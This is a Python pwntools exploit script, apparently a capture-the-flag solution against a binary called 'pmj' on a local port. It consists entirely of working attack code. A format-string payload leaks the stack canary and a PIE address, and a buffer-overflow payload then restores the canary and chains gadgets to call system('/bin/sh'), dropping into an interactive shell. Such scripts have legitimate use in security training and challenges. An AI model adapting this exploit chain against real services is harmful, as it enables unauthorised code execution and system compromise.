from pwn import *

context.binary = elf = ELF("./deploy/source/pmj")
context.arch = "amd64"
context.log_level = "info"

#sh = process(elf.path)
sh = remote("127.0.0.1",1001)

fmt = b"%15$p|%25$p" # 23 main on local
sh.sendline(fmt)

leaks = sh.recvline().strip().split(b"|")

canary = int(leaks[0], 16)
pie_leak = int(leaks[1], 16)


elf.address  = pie_leak - elf.sym["main"]


g1 = elf.address + 0x00000000000011c0   # pop r12 ; jmp r12
g2 = elf.address + 0x00000000000011d0   # pop rdi ; jmp r12
binsh = elf.address + 0x0000000000002010
system = elf.sym["system"]


log.success(f"Canary   = {hex(canary)}")
log.success(f"PIE leak = {hex(pie_leak)}")
log.success(f"PIE base  = {hex(elf.address)}")
log.success(f"g1      = {hex(g1)}")
log.success(f"g2      = {hex(g2)}")
log.success(f"system  = {hex(system)}")
log.success(f"/bin/sh = {hex(binsh)}")


payload  = b"A" * (64+8)
payload += p64(canary)        # bypass SSP
payload += b"B"*8


# rax = system
payload += p64(g1)
payload += p64(system)

# rdi = "/bin/sh"
payload += p64(g2)
payload += p64(binsh)


sh.sendline(payload)
sh.interactive()
